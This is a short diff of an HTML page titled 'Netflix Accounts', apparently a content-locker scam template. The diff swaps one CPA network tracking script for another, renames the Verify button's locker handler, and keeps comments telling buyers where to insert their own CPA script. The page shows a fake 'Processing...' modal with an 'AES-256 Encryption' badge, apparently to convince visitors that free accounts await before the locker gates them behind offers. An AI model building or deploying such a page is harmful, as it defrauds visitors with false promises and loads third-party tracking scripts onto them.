@@ -24,7 +24,7 @@
 <script src="https://cpabuild.com/public/external/locker.js"></script> -->
 
 	<!--Put Here your Cpa network Script -->
-	<script type="text/javascript" src="https://bulktrkr.com/script_include.php?id=1000206"></script>						
+	<script type="text/javascript" src="https://viral782.com/track.html?js=439384"></script>
 
 	<link rel="stylesheet" type="text/css" href="css/mainn.css">
 	<title>Netflix Accounts</title><link rel="stylesheet" href="css/_bower.css"/><link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"/><link rel="stylesheet" href="css/style.css"/></head><body><div class="popup-modal"><div class="overlay"></div><div class="white-box" id="loading-modal"><h4 class="heading">Processing...</h4><div class="progress"><div class="progress-bar progress-bar-success" id="progress-bar" role="progressbar" aria-valuenow="60" aria-valuemin="0" aria-valuemax="100" style="width: 0%"></div></div><p><i class="fa fa-expeditedssl"></i> AES-256 Encryption.</p></div><div class="white-box" id="account-modal"><h4 class="heading">Netflix Account</h4>
@@ -32,7 +32,7 @@
 
                     <!-- [Mosawi9] Edit here your onclick -->
 
-		<button class="green-btn" id="verify-btn" onclick="call_locker();";>Verify</button>
+		<button class="green-btn" id="verify-btn" onclick="run_locker();";>Verify</button>
 
                     <!-- [Mosawi9] Edit here your onclick -->
 
